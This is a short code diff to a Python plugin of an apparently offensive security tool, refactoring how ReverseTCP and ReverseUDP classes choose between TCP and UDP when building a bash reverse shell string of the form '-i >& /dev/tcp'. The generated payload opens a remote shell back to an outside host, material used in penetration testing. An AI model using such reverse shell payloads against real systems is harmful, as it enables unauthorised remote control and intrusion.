@@ -11,13 +11,14 @@ class ReverseTCP(plugin.ReverseShell):
             help="Select shell type on target machine"
         )
         self.extension = "sh"
+        self.shell_type = "tcp"
         self.set_write_file()
         self.opts.description = "[ReverseShell][TCP] Generic shells from swisskyrepo/PayloadsAllTheThings. License MIT."
         self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
 
     def make_shell(self):
         self.shell = f"{self.args.shell} -i >& /dev/"
-        if self.is_udp:
+        if self.shell_type == "udp":
             self.shell += "udp"
         else:
             self.shell += "tcp"
@@ -27,5 +28,5 @@ class ReverseTCP(plugin.ReverseShell):
 class ReverseUDP(ReverseTCP):
     def __init__(self):
         super().__init__()
-        self.is_udp = True
+        self.shell_type = "udp"
         self.opts.description = "[ReverseShell][UDP] Generic shells from swisskyrepo/PayloadsAllTheThings. License MIT."
